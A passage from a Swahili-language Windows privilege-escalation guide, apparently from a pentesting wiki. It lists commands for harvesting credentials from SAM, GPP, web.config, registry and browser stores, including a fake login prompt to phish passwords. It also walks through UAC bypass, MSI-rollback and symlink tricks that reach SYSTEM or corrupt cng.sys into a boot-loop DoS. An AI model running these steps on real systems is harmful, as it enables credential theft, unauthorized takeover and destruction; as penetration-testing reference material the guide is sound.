<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Hifadhi za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Cached GPP Pasword

Kipengele hapo awali kilipatikana ambacho kiliruhusu utekelezaji wa akaunti maalum za local administrator kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML ndani ya SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, password ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia default key iliyoandikwa hadharani, zingeweza kufunguliwa na mtumiaji yeyote aliye authenticated. Hii iliibua hatari kubwa, kwani ingeweza kuruhusu watumiaji kupata elevated privileges.

Ili kupunguza hatari hii, kazi ilitengenezwa kuchanganua faili za GPP zilizohifadhiwa locally zilizo na uwanja wa "cpassword" ambao si tupu. Baada ya kupata faili kama hiyo, kazi hiyo hufungua password na kurejesha custom PowerShell object. Object hii inajumuisha maelezo kuhusu GPP na mahali faili ilipo, ikisaidia katika utambuzi na kurekebisha udhaifu huu wa usalama.

Tafuta ndani ya `C:\ProgramData\Microsoft\Group Policy\history` au ndani ya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili kufungua cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config wenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Hati za OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba sifa za kuingia

Unaweza kila wakati **kumwomba mtumiaji aingize sifa zake za kuingia au hata sifa za kuingia za mtumiaji mwingine** ikiwa unafikiri anaweza kuzijua (tambua kwamba **kuomba** mteja moja kwa moja **sifa za kuingia** ni jambo la **hatari** sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayowezekana kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani ziliwahi kuwa na **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Vitambulisho ndani ya RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta vitambulisho vilivyo ndani yake

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Funguo zingine zinazowezekana za registry zenye vitambulisho**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys kutoka registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Unapaswa kuangalia dbs ambapo passwords kutoka **Chrome or Firefox** zimehifadhiwa.\
Pia angalia history, bookmarks na favourites za browsers ili huenda baadhi ya **passwords are** zimehifadhiwa hapo.

Tools za kutoa passwords kutoka browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni technology iliyojengwa ndani ya Windows operating system inayoruhusu **intercommunication** kati ya software components za lugha tofauti. Kila COM component hutambulishwa kupitia **class ID (CLSID)** na kila component hutoa functionality kupitia interfaces moja au zaidi, zinazoitambulishwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa katika registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32** ambayo ina **default value** inayoelekeza kwenye **DLL** na value iitwayo **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **overwrite any of the DLLs** ambazo zitaendeshwa, unaweza **escalate privileges** ikiwa DLL hiyo itaendeshwa na mtumiaji tofauti.

Ili kujifunza jinsi attackers hutumia COM Hijacking kama persistence mechanism angalia:


{{#ref}}
com-hijacking.md
{{endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta registry kwa majina ya key na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin nimeunda plugin hii ili **kuendesha kiotomatiki kila moduli ya metasploit POST inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za zana kadhaa zinazohifadhi data hii kwa maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **a process running as SYSTEM open a new process** (`OpenProcess()`) **with full access**. Process hiyo hiyo pia **create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Kisha, ikiwa una **full access to the low privileged process**, unaweza kuchukua **open handle to the privileged process created** with `OpenProcess()` na **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu za pamoja, zinazojulikana kama **pipes**, huwezesha mawasiliano ya process na uhamishaji wa data.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia network tofauti. Hii inafanana na client/server architecture, ambapo majukumu yanafafanuliwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe hiyo ina uwezo wa **kuchukua utambulisho** wa **client**, ikiwa ina **SeImpersonate** rights zinazohitajika. Kutambua **privileged process** inayowasiliana kupitia pipe unayoweza kuiiga kunatoa fursa ya **kupata privileges za juu zaidi** kwa kuchukua utambulisho wa process hiyo mara tu inaposhirikiana na pipe uliyoweka. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo yenye manufaa inaweza kupatikana [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Pia tool ifuatayo inaruhusu **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) katika server mode inaonyesha `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client anaweza kutumia mailslot-based async event path kubadili `ClientAttach` kuwa **4-byte write** ya kiholela kwa faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata Telephony admin rights na kupakia DLL ya kiholela kama service. Mchakato kamili:

- `ClientAttach` ukiweka `pszDomainUser` kuwa path iliyopo inayoweza kuandikwa → service huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa async event writes.
- Kila event huandika `InitContext` inayodhibitiwa na attacker kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), chochea `TRequestMakeCall` (`Req_Func 121`), chukua kupitia `GetAsyncEvents` (`Req_Func 0`), kisha unregister/shutdown ili kurudia deterministic writes.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, reconnect, kisha piga `GetUIDllName` na path ya DLL ya kiholela ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wakati unapopata shell kama user, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hukusanya process command lines kila baada ya sekunde mbili na kulinganisha hali ya sasa na ya awali, kisha kutoa tofauti zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba passwords kutoka kwa processes

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una access ya graphical interface (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya versions za Microsoft Windows inawezekana kuendesha terminal au any other process kama "NT\AUTHORITY SYSTEM" kutoka kwa user asiye na privileges.

Hii inafanya iwezekane kuongeza privileges na bypass UAC wakati huohuo kwa kutumia vulnerability ile ile. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa process hii imesainiwa na kutolewa na Microsoft.

Baadhi ya systems zilizoathiriwa ni hizi zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **kujifunza kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili kujifunza kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Technique iliyoelezwa [**katika blog post hii**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) yenye exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio kwa kawaida linajumuisha kutumia vibaya Windows Installer rollback feature ili kubadilisha files halali na zile zenye nia mbaya wakati wa mchakato wa uninstall. Kwa hili, attacker anahitaji kuunda **malicious MSI installer** ambayo itatumika ku-hijack folder `C:\Config.Msi`, ambalo baadaye litatumiwa na Windows Installer kuhifadhi rollback files wakati wa uninstall ya nyingine MSI packages, ambapo rollback files hizo zitakuwa zimebadilishwa ili kuwa na malicious payload.

Technique iliyofupishwa ni hii ifuatayo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Tengeneza `.msi` ambayo inasakinisha file isiyo na madhara (kwa mfano, `dummy.txt`) ndani ya folder inayoweza kuandikwa (`TARGETDIR`).
- Weka installer kama **"UAC Compliant"**, ili **non-admin user** aweze kui-run.
- Acha **handle** wazi kwa file hiyo baada ya install.

- Step 2: Begin Uninstall
- Uninstall `.msi` hiyo hiyo.
- Mchakato wa uninstall unaanza kuhamisha files kwenda `C:\Config.Msi` na kuzibadilisha majina kuwa files za `.rbf` (rollback backups).
- **Poll the open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati file inakuwa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Huashiria wakati `.rbf` imeandikwa.
- Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Step 4: Block Deletion of `.rbf`
- Inapoashiriwa, **fungua file ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia kufutwa** kwake.
- Kisha **ashiria kurudi** ili uninstall iendelee.
- Windows Installer inashindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta contents zote, **`C:\Config.Msi` haiondolewi**.

- Step 5: Manually Delete `.rbf`
- Wewe (attacker) futa file ya `.rbf` manually.
- Sasa **`C:\Config.Msi` iko empty**, tayari kwa hijack.

> Kwa hatua hii, **trigger vulnerability ya SYSTEM-level arbitrary folder delete** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Tengeneza tena folder `C:\Config.Msi` mwenyewe.
- Weka **weak DACLs** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Step 7: Run Another Install
- Install `.msi` tena, na:
- `TARGETDIR`: eneo linaloweza kuandikwa.
- `ERROROUT`: variable inayosababisha forced failure.
- Install hii itatumika ku-trigger **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Step 8: Monitor for `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
- Capture jina lake la file.

- Step 9: Sync Before Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Huashiria event wakati `.rbs` inaundwa.
- Kisha **husubiri** kabla ya kuendelea.

- Step 10: Reapply Weak ACL
- Baada ya kupokea event ya `.rbs created`:
- Windows Installer **huweka upya strong ACLs** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka upya weak ACLs** tena.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, hivyo bado unaweza kuandika kwenye folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite file ya `.rbs` kwa **fake rollback script** ambayo inaambia Windows:
- Rudisha file yako ya `.rbf` (malicious DLL) kwenda kwenye **privileged location** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop fake `.rbf` yako yenye **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Ashiria sync event ili installer iendelee.
- A **type 19 custom action (`ErrorOut`)** imewekwa ili **kushindwa kimakusudi** install katika point inayojulikana.
- Hii husababisha **rollback kuanza**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Husoma malicious `.rbs` yako.
- Hunanakili `.rbf` yako DLL kwenda target location.
- Sasa una **malicious DLL yako katika SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run trusted **auto-elevated binary** (kwa mfano, `osk.exe`) inayopakia DLL uliyohijack.
- **Boom**: Code yako ina-executed **as SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Main MSI rollback technique (ile ya awali) inadhania unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini je, vulnerability yako inaruhusu tu **arbitrary file deletion** ?

Unaweza kutumia **NTFS internals**: kila folder ina hidden alternate data stream inayoitwa:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hii stream huhifadhi **index metadata** ya folda.

Kwa hivyo, ukifuta **`::$INDEX_ALLOCATION` stream** ya folda, NTFS **huondoa folda nzima** kutoka kwenye filesystem.

Unaweza kufanya hivi kwa kutumia standard file deletion APIs kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaita API ya kufuta *file*, inafuta **folder yenyewe**.

### Kutoka Kufuta Maudhui ya Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako hairuhusu kufuta files/folders za kiholela, lakini **inaruhusu kufuta *maudhui* ya folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha utekelezaji** wakati process yenye privilege inajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua ya 3: Chochea mchakato wa SYSTEM (k.m., `SilentCleanup`)
- Mchakato huu huchanganua folda (k.m., `%TEMP%`) na hujaribu kufuta yaliyomo yake.
- Unapofika kwenye `file1.txt`, **oplock inachochewa** na inakabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza ufutaji upya

- Chaguo A: Sogeza `file1.txt` mahali pengine
- Hii huondoa yaliyomo ya `folder1` bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo lingetoa oplock mapema mno.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga NTFS internal stream ambayo huhifadhi metadata ya folda — kuifuta huifuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda Yoyote Hadi Permanent DoS

Tumia primitive inayokuwezesha **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika files** au **kuweka weak permissions**.

Unda **folder** (sio file) yenye jina la **critical Windows driver**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Padri hii kwa kawaida inaendana na kiendeshi cha kernel-mode `cng.sys`.
- Uki **kiunda mapema kama folda**, Windows hushindwa kupakia kiendeshi halisi wakati wa boot.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa boot.
- Inaona folda hiyo, **inashindwa kutatua kiendeshi halisi**, na **inadondoka au kusitisha boot**.
- Hakuna **fallback**, na **hakuna recovery** bila uingiliaji wa nje (k.m., boot repair au ufikiaji wa disk).

### Kutoka njia za log/backup zenye privileged + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati **privileged service** inaandika logs/exports kwenda kwenye path inayosomeka kutoka kwa **writable config**, elekeza path hiyo kwa **Object Manager symlinks + NTFS mount points** ili kugeuza uandishi wa privileged kuwa arbitrary overwrite (hata **bila** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Config inayohifadhi target path iwe inaweza kuandikwa na mshambuliaji (k.m., `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni ya privileged inayoiandikia path hiyo (log, export, report).

**Mnyororo wa mfano**
1. Soma config ili kurejesha log destination ya privileged, k.m. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza path bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri hadi sehemu yenye privilijes iandike logi (mf., admin achochee "send test SMS"). Uandishi sasa unatua kwenye `C:\Windows\System32\cng.sys`.
4. Kagua lengo lililoandikwa juu yake (hex/PE parser) ili kuthibitisha uharibifu; reboot hulazimisha Windows kupakia njia ya driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo huduma yenye privilijes itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo kwenye `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, hivyo kuifanya kuwa sinki la kuaminika la DoS kwa data iliyoharibika.



## **Kutoka High Integrity kwenda System**

### **Huduma mpya**

Ikiwa tayari unaendesha kwenye process ya High Integrity, **njia kwenda SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapounda service binary hakikisha ni valid service au kwamba binary inatekeleza vitendo vinavyohitajika haraka sana kwa kuwa itauawa baada ya 20s ikiwa si valid service.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwasha AlwaysInstallElevated registry entries** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha pakiti ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ukishakuwa na token privileges hizo (huenda utaipata hii kwenye mchakato wa High Integrity tayari), utaweza **kufungua karibu kila process** (zisizo protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya process, na kuunda **arbitrary process kwa token hiyo**.\
Kwa kawaida mbinu hii **huchagua process yoyote inayoendesha kama SYSTEM ikiwa na token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kupandisha mamlaka katika `getsystem`. Mbinu hii inahusisha **kuunda pipe na kisha kuunda/kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuimpersonate token** ya client wa pipe hiyo (service) na kupata SYSTEM privileges.\
